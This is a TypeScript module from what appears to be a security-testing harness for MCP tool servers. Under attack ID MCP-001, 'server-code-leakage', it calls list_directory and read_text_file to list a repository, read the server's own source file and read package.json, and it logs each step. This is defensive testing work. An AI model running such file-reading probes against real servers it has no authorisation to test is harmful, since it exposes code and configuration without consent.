import type { MCPClient } from '../attack-runner/mcp_client.js';
import type { AttackLogEntry } from '../attack-runner/attack_types.js';

export async function runAttack(
  client: MCPClient,
  logStep: (entry: AttackLogEntry) => void
): Promise<void> {
  let step = 0;

  // Step 1: List directory to see repo structure
  step++;
  try {
    const response = await client.sendRequest('tools/call', {
      name: 'list_directory',
      arguments: { path: '.' },
    });
    
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-001',
      variant: 'server-code-leakage',
      step,
      request: { method: 'tools/call', params: { name: 'list_directory', arguments: { path: '.' } } },
      responseSnippet: JSON.stringify(response).slice(0, 200),
      success: true,
    });
  } catch (error) {
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-001',
      variant: 'server-code-leakage',
      step,
      request: { method: 'tools/call', params: { name: 'list_directory', arguments: { path: '.' } } },
      responseSnippet: error instanceof Error ? error.message : String(error),
      success: false,
    });
  }

  // Step 2: Read server code to demonstrate leakage
  step++;
  try {
    const response = await client.sendRequest('tools/call', {
      name: 'read_text_file',
      arguments: { path: 'src/filesystem-server-code-leakage/index.ts' },
    });
    
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-001',
      variant: 'server-code-leakage',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: 'src/filesystem-server-code-leakage/index.ts' } } },
      responseSnippet: JSON.stringify(response).slice(0, 200),
      success: true,
    });
  } catch (error) {
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-001',
      variant: 'server-code-leakage',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: 'src/filesystem-server-code-leakage/index.ts' } } },
      responseSnippet: error instanceof Error ? error.message : String(error),
      success: false,
    });
  }

  // Step 3: Try to read other sensitive files
  step++;
  try {
    const response = await client.sendRequest('tools/call', {
      name: 'read_text_file',
      arguments: { path: 'package.json' },
    });
    
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-001',
      variant: 'server-code-leakage',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: 'package.json' } } },
      responseSnippet: JSON.stringify(response).slice(0, 200),
      success: true,
    });
  } catch (error) {
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-001',
      variant: 'server-code-leakage',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: 'package.json' } } },
      responseSnippet: error instanceof Error ? error.message : String(error),
      success: false,
    });
  }
}

